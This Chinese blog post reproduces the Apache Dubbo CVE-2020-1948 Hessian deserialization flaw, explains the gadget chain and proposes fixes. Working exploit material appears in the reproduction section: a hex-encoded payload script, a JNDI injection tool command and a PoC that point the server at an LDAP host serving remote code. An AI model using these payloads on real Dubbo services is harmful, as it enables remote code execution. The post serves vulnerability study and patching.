<!DOCTYPE html>

<html class lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">








<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Java,">








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">






<meta name="description" content="跟踪源码，学习 Dubbo 调用源码流程">
<meta name="keywords" content="Java">
<meta property="og:type" content="article">
<meta property="og:title" content="Dubbo 漏洞 CVE-2020-1948 复现+简单修复">
<meta property="og:url" content="http://yoursite.com/2020/07/21/java/2020-07-21-dubbo-cve-2020-1948/index.html">
<meta property="og:site_name" content="JingQ">
<meta property="og:description" content="跟踪源码，学习 Dubbo 调用源码流程">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://img.sevenyuan.cn/header/AugustStargazing_ZH-CN9929724138_1920x1080.jpg">
<meta property="og:image" content="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/dubbo_sample_provider_import.png">
<meta property="og:image" content="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/dubbo_provider_use_jre.png">
<meta property="og:image" content="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/JNDI_demo.png">
<meta property="og:image" content="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/CVE-2020-1948-Reproduction.gif">
<meta property="og:image" content="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/rome_ToStringBean.png">
<meta property="og:image" content="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/jdbcRowSetImpl_connect_result.png">
<meta property="og:image" content="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/decode_by_hession.png">
<meta property="og:image" content="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/equalsBean_hashcode_chain.png">
<meta property="og:image" content="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/CVE_2020-1948_github_comment.png">
<meta property="og:updated_time" content="2020-08-23T11:54:57.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Dubbo 漏洞 CVE-2020-1948 复现+简单修复">
<meta name="twitter:description" content="跟踪源码，学习 Dubbo 调用源码流程">
<meta name="twitter:image" content="http://img.sevenyuan.cn/header/AugustStargazing_ZH-CN9929724138_1920x1080.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    sidebar: {"position":"left","display":"always","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'JingQ'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/07/21/java/2020-07-21-dubbo-cve-2020-1948/">





  <title>Dubbo 漏洞 CVE-2020-1948 复现+简单修复 | JingQ</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">JingQ</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-javatech">
          <a href="http://www.justdojava.com/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
            
            Java Geek Tech
          </a>
        </li>
      

      
    </ul>
  

  
</nav>

<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/21/java/2020-07-21-dubbo-cve-2020-1948/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="JingQ">
      <meta itemprop="description" content>
      <meta itemprop="image" content="http://img.sevenyuan.cn/panda.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JingQ">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Dubbo 漏洞 CVE-2020-1948 复现+简单修复</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-21T18:16:51+08:00">
                2020-07-21
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Java/" itemprop="url" rel="index">
                    <span itemprop="name">Java</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i> 游览
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>次
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><img src="http://img.sevenyuan.cn/header/AugustStargazing_ZH-CN9929724138_1920x1080.jpg" alt></p>
<center>跟踪源码，学习 Dubbo 调用源码流程</center>

<a id="more"></a>
<hr>
<p>关注该漏洞的童鞋，应该对 <code>Dubbo</code> 这个架构优秀的 <code>RPC</code> 框架不陌生，所以直入主题</p>
<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>腾讯安全玄武实验室研究员发现，<code>Dubbo 2.7.6</code> 或更低版本采用的默认反序列化方式存在代码执行漏洞，当 <code>Dubbo</code> 服务端暴露时(默认端口：20880)，攻击者可以发送未经验证的服务名或方法名的RPC请求，同时配合附加恶意的参数负载。当恶意参数被反序列化时，它将执行恶意代码。</p>
<p>经验证该反序列化漏洞需要服务端存在可以被利用的第三方库，而研究发现极大多数开发者都会使用的某些第三方库存在能够利用的攻击链，攻击者可以利用它们直接对 <code>Dubbo</code> 服务端进行恶意代码执行，影响广泛。</p>
<p><strong>影响版本</strong></p>
<p>dubbo 2.7.6 以下的版本</p>
<p><strong>复现环境</strong></p>
<ul>
<li>mac 10.15</li>
<li>idea 2020.1</li>
<li>jdk-8u151（<a href="https://www.oracle.com/webapps/redirect/signon?nexturl=https://download.oracle.com/otn/java/jdk/8u151-b12/e758a0de34e24606bca991d704f6dcbf/jdk-8u151-macosx-x64.dmg" target="_blank" rel="noopener">下载地址</a>）</li>
</ul>
<p><strong>漏洞注入简介</strong></p>
<p>漏洞发现者 <code>rui0</code>，使用 <code>Remo</code> 模块，最终是通过 <code>JdbcRowSetImpl</code> 调用 <code>jndi</code> 来进行远程代码执行</p>
<p><strong>由于该场景复现依赖于低版本的 jdk，之前使用 jdk-8u221 没能复现，去官网下载回低版本，使用低版本后成功复现</strong></p>
<hr>
<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><ul>
<li><strong>PoC：</strong> <code>Proof Of Concept</code> 的缩写。在黑客圈指：观点验证程序。</li>
<li><strong>CVE：</strong> <code>Common Vulnerabilities &amp; Exposures</code> 通用漏洞披露。</li>
<li><strong>Exp</strong>：<code>Exploit</code>，在安全方面，翻译为 「利用」，指利用漏洞进行攻击的动作。</li>
<li><strong>Payload</strong>：翻译为「有效负荷」，指成功 <code>exploit</code> 后，在目标系统执行的代码或指令。</li>
<li><strong>RCE</strong>：<code>remote code execution</code> 远程命令执行，简称 <code>RCE</code> 漏洞。</li>
<li><strong>RMI：</strong> 专为 <code>Java</code> 环境设计的远程方法调用机制，远程服务器实现具体的 <code>Java</code> 方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法并获取执行结果，使分布在不同的 <code>JVM</code> 中的对象的外表和行为都像本地对象一样。</li>
<li><strong>LDAP：</strong> 轻量级目录访问协议，目录服务是一种以树状结构的目录数据库为基础，外加各种访问协议的信息查询服务</li>
<li><strong>JNDI：</strong> <code>Java Naming and Directory Interface</code>，包括 <code>Naming Server</code> 和 <code>Directory Server</code>。是一种 <code>Java API</code>，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。</li>
</ul>
<p>以上大概就是本次漏洞所涉及到的专业名词，先有个大概了解，后面的内容看的应该比较明白。</p>
<hr>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>复现场景翻阅了很多篇文章和尝试，发现通过别人构造的 <code>payload</code> 来复现最为简单，所以这里记录一下复现的流程</p>
<h3 id="模拟-Provider"><a href="#模拟-Provider" class="headerlink" title="模拟 Provider"></a>模拟 Provider</h3><p>攻击依赖于 <code>rome</code> 工具包中的 <code>ToStringBean</code> 工具，所以无论下载什么提供者项目，都需要将以下依赖加入到 <code>POM.xml</code> 文件中</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rometools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>以 <code>dubbo-spring-boot-project</code> 说明</p>
<ul>
<li>一、在 <code>github</code> 下载示例代码，切换分支到 2.7.6 或更早之前</li>
<li>二、在 <code>pom.xml</code> 中加入上面提到的 <code>remo</code> 依赖</li>
<li>三、打包启动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 下载</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/apache/dubbo-spring-boot-project.git</span></span><br><span class="line">// 切换分支</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout 2.7.6</span></span><br><span class="line">// 添加完依赖后，打包</span><br><span class="line"><span class="meta">$</span><span class="bash"> mvn clean install -DskipTests</span></span><br></pre></td></tr></table></figure>
<p><img src="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/dubbo_sample_provider_import.png" alt></p>
<ul>
<li>四、启动服务提供者</li>
</ul>
<p>启动的时候，注意要用低版本的 <code>JDK</code>，使用 <code>IDEA</code> 的话，可以在这里选择编译运行的 <code>JRE</code></p>
<p><img src="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/dubbo_provider_use_jre.png" alt></p>
<p>接着启动 <code>Provier</code> 即可</p>
<hr>
<h3 id="运行-JNDI-程序"><a href="#运行-JNDI-程序" class="headerlink" title="运行 JNDI 程序"></a>运行 JNDI 程序</h3><p>使用了该位大佬的 <code>PoC</code>，里面注入的 <code>URL</code> 是 <code>ldap://127.0.0.1:1389/Exploit</code>，具体原理可以 <a href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md" target="_blank" rel="noopener">参考资料六</a></p>
<p>具体原理说明：</p>
<p><img src="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/JNDI_demo.png" alt></p>
<p>以下内容引用自 <a href="https://www.sayers.top/cve_2020_1948.html" target="_blank" rel="noopener">Apache Dubbo Provider反序列化漏洞(CVE-2020-1948) 利用复现及POC</a></p>
<ul>
<li>一、下载注入工具代码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/sayers522/JNDI-Injection-Exploit</span></span><br></pre></td></tr></table></figure>
<ul>
<li>二、编译工具包，在 <code>target</code> 目录生成</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mvn clean install -DskipTests</span></span><br></pre></td></tr></table></figure>
<ul>
<li>三、运行 <code>JNDI</code> 工具包</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [<span class="built_in">command</span>] [-A] [address]</span></span><br></pre></td></tr></table></figure>
<p>例如测试时，执行的命令是打开计算器，可以执行下面命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open /System/Applications/Calculator.app" -A 127.0.0.1</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="构造-PoC-对应的-payload"><a href="#构造-PoC-对应的-payload" class="headerlink" title="构造 PoC 对应的 payload"></a>构造 PoC 对应的 payload</h3><p>编辑以下 Python 脚本，触发 dubbo provider 反序列化，例如以漏洞名来命名为 <code>2020_1948.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendEvilObjData</span><span class="params">(sock)</span>:</span></span><br><span class="line">	payload=<span class="string">"DABBC20000000000000000000000037805322E302E3230366F72672E6170616368652E647562626F2E737072696E672E626F6F742E64656D6F2E636F6E73756D65722E44656D6F5365727669636505312E302E300474657374124C6A6176612F6C616E672F4F626A6563743B48433027636F6D2E726F6D65746F6F6C732E726F6D652E666565642E696D706C2E457175616C734265616E92036F626A096265616E436C61737360433029636F6D2E726F6D65746F6F6C732E726F6D652E666565642E696D706C2E546F537472696E674265616E92036F626A096265616E436C61737361431D636F6D2E73756E2E726F777365742E4A646263526F77536574496D706CAC06706172616D73096C697374656E657273036D61700A6368617253747265616D0B617363696953747265616D0D756E69636F646553747265616D0C62696E61727953747265616D0F7374724D61746368436F6C756D6E730D694D61746368436F6C756D6E73057265734D4406726F77734D4402727302707304636F6E6E09666574636853697A650866657463684469720969736F6C6174696F6E1065736361706550726F63657373696E6708726561644F6E6C790B636F6E63757272656E63790C6D61784669656C6453697A65076D6178526F77730C717565727954696D656F75740B73686F7744656C657465640A726F77536574547970650A64617461536F757263650355524C07636F6D6D616E64624D136A6176612E7574696C2E486173687461626C655A4E4E4E4E4E4E56106A6176612E7574696C2E566563746F729A03666F6F4E4E4E4E4E4E4E4E4E56919A8F8F8F8F8F8F8F8F8F8F4E4E4E4E4E90CBE8925454CBF090909046CBEC1D6C6461703A2F2F3132372E302E302E313A313338392F4578706C6F69744E4E430F6A6176612E6C616E672E436C61737391046E616D65631D636F6D2E73756E2E726F777365742E4A646263526F77536574496D706C633029636F6D2E726F6D65746F6F6C732E726F6D652E666565642E696D706C2E546F537472696E674265616E5191519151915A48047061746830366F72672E6170616368652E647562626F2E737072696E672E626F6F742E64656D6F2E636F6E73756D65722E44656D6F5365727669636509696E7465726661636530366F72672E6170616368652E647562626F2E737072696E672E626F6F742E64656D6F2E636F6E73756D65722E44656D6F536572766963650776657273696F6E05312E302E305A"</span></span><br><span class="line">	sock.send(payload.decode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(dip,dport)</span>:</span></span><br><span class="line">	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">	server_addr=(dip,dport)</span><br><span class="line">	sock.connect(server_addr)</span><br><span class="line">	sendEvilObjData(sock)</span><br><span class="line"></span><br><span class="line">run(<span class="string">"127.0.0.1"</span>,<span class="number">12345</span>)</span><br></pre></td></tr></table></figure>
<p><strong>最终复现效果：</strong></p>
<p><img src="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/CVE-2020-1948-Reproduction.gif" alt></p>
<h3 id="漏洞复现小结"><a href="#漏洞复现小结" class="headerlink" title="漏洞复现小结"></a>漏洞复现小结</h3><ul>
<li>1、下载 <code>demo</code> 代码，加入 <code>rome</code> 依赖</li>
<li>2、启动 <code>JNDI</code> 服务</li>
<li>3、构造 <code>2020-1948.py</code> Poc 攻击</li>
</ul>
<hr>
<h2 id="漏洞原理简述"><a href="#漏洞原理简述" class="headerlink" title="漏洞原理简述"></a>漏洞原理简述</h2><p>网上公布的 <code>PoC</code> 代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> dubbo.codec.hessian2 <span class="keyword">import</span> Decoder,new_object</span><br><span class="line"><span class="keyword">from</span> dubbo.client <span class="keyword">import</span> DubboClient</span><br><span class="line"></span><br><span class="line">client = DubboClient(<span class="string">'127.0.0.1'</span>, <span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">JdbcRowSetImpl=new_object(</span><br><span class="line">      <span class="string">'com.sun.rowset.JdbcRowSetImpl'</span>,</span><br><span class="line">      dataSource=<span class="string">"ldap://127.0.0.1:8087/#ExportObject"</span>,</span><br><span class="line">      strMatchColumns=[<span class="string">"foo"</span>]</span><br><span class="line">      )</span><br><span class="line">JdbcRowSetImplClass=new_object(</span><br><span class="line">      <span class="string">'java.lang.Class'</span>,</span><br><span class="line">      name=<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">      )</span><br><span class="line">toStringBean=new_object(</span><br><span class="line">      <span class="string">'com.rometools.rome.feed.impl.ToStringBean'</span>,</span><br><span class="line">      beanClass=JdbcRowSetImplClass,</span><br><span class="line">      obj=JdbcRowSetImpl</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">    service_name=<span class="string">'org.apache.dubbo.spring.boot.demo.consumer.DemoService'</span>,</span><br><span class="line">    method_name=<span class="string">'rce'</span>,</span><br><span class="line">    args=[toStringBean])</span><br></pre></td></tr></table></figure>
<p>本次漏洞利用的是 <code>com.rometools.rome.feed.impl.ToStringBean#toString</code> 方法，重写了 <code>toString</code>，该方法将会调用构造对象的所有 <code>getter</code> 方法</p>
<p><img src="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/rome_ToStringBean.png" alt></p>
<p>从上面 <code>PoC</code> 可以看到，执行 <code>Dubbo</code> 调用时，传入的是 <code>ToStringBean</code> 类型参数，构造的对象是<code>com.sun.rowset.JdbcRowSetImpl</code>，并且 <code>datasource</code> 属性设置的是 <code>JNDI</code> 暴露的 <code>url</code>，在调用 <code>JdbcRowSetImpl</code> 的 <code>getDatabaseMetaData</code> 方法时，执行 <code>connect</code> 操作，下载远端代码，在 <code>Service Provider</code> 执行，造成攻击。</p>
<p><img src="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/jdbcRowSetImpl_connect_result.png" alt></p>
<p>调起 <code>toString</code> 方法的地方是在 <code>Dubbo Provider</code> 接收 <code>DecodeHandler#received:44</code> 请求，在 <code>DecodeableRpcInvocation#decode</code> 反序列化参数的地方：</p>
<p><img src="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/decode_by_hession.png" alt></p>
<p><code>dubbo</code> 默认使用的是 <code>hession2</code> 序列化，解析参数执行的是这个方法</p>
<blockquote>
<p>org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput#readUTF</p>
</blockquote>
<p>在 <code>hession</code> 反序列化过程中，通过下面代码段执行到了 <code>ToStringBean#toString</code></p>
<p><img src="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/equalsBean_hashcode_chain.png" alt></p>
<p>至此，注入攻击的流程到这里执行完成。可以参考左下侧的堆栈链路：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">connect:624, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">toString:158, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">toString:129, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hashCode:180, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hash:339, HashMap (java.util)</span><br><span class="line">put:612, HashMap (java.util)</span><br><span class="line">doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:2703, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:2278, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:2080, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:2074, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:92, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)</span><br><span class="line">decode:139, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:79, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">received:44, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="社区讨论-amp-安全网站修复建议"><a href="#社区讨论-amp-安全网站修复建议" class="headerlink" title="社区讨论&amp;安全网站修复建议"></a>社区讨论&amp;安全网站修复建议</h2><ul>
<li><p>合并社区 <code>aquariuspj</code> 用户给出的对 <code>DecodeableRpcInvocation</code> 增加入参类型校验 </p>
<p>  <a href="https://github.com/apache/dubbo/commit/5ad186fa874d9f0dfb87b989e54c1325d39abd40" target="_blank" rel="noopener">修复分支 #6374</a></p>
</li>
<li>漏洞发现者 <code>rui0</code> 建议删除 <code>RpcInvocation</code> 类的 <code>toString</code> 方法中输出的 <code>arguments</code> 参数,防范后反序列化攻击。同时对 <code>Hessian</code> 进行黑白名单加固来防范 <code>Hessian</code> 反序列化攻击。<br>  <a href="http://rui0.cn/archives/1338" target="_blank" rel="noopener">评论建议</a></li>
</ul>
<p>还有<a href="https://developer.aliyun.com/article/766283" target="_blank" rel="noopener">阿里云官方的安全建议</a></p>
<blockquote>
<p>目前官方还未发布针对此漏洞绕过手法的补丁，在阿里云提供一个月的默认防御期限内，建议客户参考以下方法进行缓解，并关注官方补丁动态，及时进行更新：</p>
</blockquote>
<ul>
<li>1、升级 2.7.7 版本，并根据<a href="https://github.com/apache/dubbo/pull/6374/commits/8fcdca112744d2cb98b349225a4aab365af563de" target="_blank" rel="noopener">https://github.com/apache/dubbo/pull/6374/commits/8fcdca112744d2cb98b349225a4aab365af563de</a> 的方法进行参数校验</li>
<li>禁止将 <code>Dubbo</code> 服务端端口开放给公网，或仅仅只对能够连接至 <code>Dubbo</code> 服务端的可信消费端IP开放</li>
<li><code>Dubbo</code> 协议默认采用 <code>Hessian</code> 作为序列化反序列化方式，该反序列化方式存在反序列化漏洞。在不影响业务的情况下，建议更换协议以及反序列化方式。具体更换方法可参考：<a href="http://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html" target="_blank" rel="noopener">http://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html</a></li>
</ul>
<hr>
<h2 id="思考分析-amp-修复思路"><a href="#思考分析-amp-修复思路" class="headerlink" title="思考分析&amp;修复思路"></a>思考分析&amp;修复思路</h2><h3 id="1、复现条件有限"><a href="#1、复现条件有限" class="headerlink" title="1、复现条件有限"></a>1、复现条件有限</h3><p>需要引入 <code>rome</code> 类型的 <code>jar</code> 包，包含特殊的构造方法和 <code>toString</code> 方法（或许还有其它攻击点）</p>
<h3 id="2、社区讨论内容"><a href="#2、社区讨论内容" class="headerlink" title="2、社区讨论内容"></a>2、社区讨论内容</h3><p>社区讨论和 <code>commit</code> 的内容，增加了前置校验，在反序列化之前判断服务或方法是否有效，非 <code>$invoke</code> 或 <code>$echo</code> 方法将会抛出错误，不进行参数的反序列化，增加了一点攻击难度。但由于方法名 <code>methodName</code> 可以用户自定义，所以修改方法名还是有可能跳过校验，触发漏洞</p>
<p><img src="http://img.sevenyuan.cn/dubbo/CVE-2020-1948/CVE_2020-1948_github_comment.png" alt></p>
<h3 id="3、结合业务分析"><a href="#3、结合业务分析" class="headerlink" title="3、结合业务分析"></a>3、结合业务分析</h3><p>业务方使用 <code>rome</code>  依赖的很少，构造这种类型的攻击，由于没有这个类，在 <code>provider</code> 反序列化时会提前报 <code>classNotFoundException</code>，没有执行到 <code>readObject</code> 方法，从而无法攻击。</p>
<font color="RED"><strong>综上所述，考虑到修复难度和影响范围，最后对 dubbo 修改方案如下：</strong></font>

<ul>
<li><p>1、合并社区针对改漏洞的<a href="https://github.com/apache/dubbo/commit/5ad186fa874d9f0dfb87b989e54c1325d39abd40" target="_blank" rel="noopener">修复分支 #6374</a></p>
</li>
<li><p>2、将 <code>RpcInvocation#toString</code> 方法中 <code>Arrays.toString(arguments)</code> 移除，避免对输入参数进行反序列化</p>
</li>
</ul>
<hr>
